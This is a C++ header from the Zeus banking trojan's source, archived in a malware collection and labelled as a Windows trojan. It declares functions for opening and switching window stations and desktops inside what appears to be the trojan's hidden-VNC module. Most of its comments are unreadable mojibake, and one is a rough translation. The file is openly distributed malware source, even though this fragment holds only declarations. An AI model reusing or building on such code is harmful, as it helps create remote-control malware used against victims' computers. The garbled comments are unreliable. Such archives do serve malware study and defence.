/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ � Window Station's � Desktop's.

  ����������: �.�. ������ ����������� ��������������� ����� �����, ��������� ���� ������������
              ������������, � ����� �� ������.
*/
#pragma once

#if(BO_VNC > 0)
namespace WindowStation
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ����� �������.

    IN handle - ������.

    Return    - ��� �������, ���������� ���������� ����� Mem. ��� NULL � ������ ������.
  */
  LPWSTR _getObjectName(HANDLE handle);

  /*
    ��������� ��������� �� ������ �� ���� � ����� ������.

    IN handle1 - ������ 1.
    IN handle2 - ������ 2.

    Return     - true - ���� ������ ����������� ������ � ������� �������,
                 false - � ��������� ������.
  */
  bool _isEqualObjects(HANDLE handle1, HANDLE handle2);

  /*
    ��������� ��� ������� �������.
    
    IN name          - ��� ������� ��� NULL ��� ��������� Winsta0.
    IN desiredAccess - ����� �������.

    Return           - ����� ������� (����� �������� ����� CloseWindowStation),
                       ��� NULL � ������ ������.
  */
  HWINSTA _openWindowStation(const LPWSTR name, ACCESS_MASK desiredAccess);

  /*
    ��������� ������� ������� ��� �������.

    IN handle - ������� ��� ���������.

    Return    - true - � ������ ������,
                false - � ������ ������.
  */
  bool _setProcessWindowStation(HWINSTA handle);

  /*
    ��������� ��� ������� �������.

    IN name          - ��� �������� ��� NULL ��� ��������� default.
    IN desiredAccess - ����� �������.

    Return           - ����� ������� (����� �������� ����� CloseDesktop),
                       ��� NULL � ������ ������.
  */
  HDESK _openDesktop(const LPWSTR name, ACCESS_MASK desiredAccess);

  /*
    ������������ ������� ������ �� �������.

    IN handle - ������ �� ������� ������� �������������.

    Return    - true - � ������ ������,
                false - � ������ ������.
  */
  bool _setThreadDesktop(HDESK handle);

  /*    Switching streamed flow on desktops.

    IN stationName - station name, or NULL to install Winsta0. If the station does not suschetvuet,
                     it will be created.
    IN desktopName - the name of the desktops or NULL to set the default. If the desktops are not suschetvuet,
                     it will be created.

    Return - true - if successful,
                     false - if an error occurs.
  */
  bool _setThreadDesktopEx(const LPWSTR stationName, const LPWSTR desktopName);
};
#endif
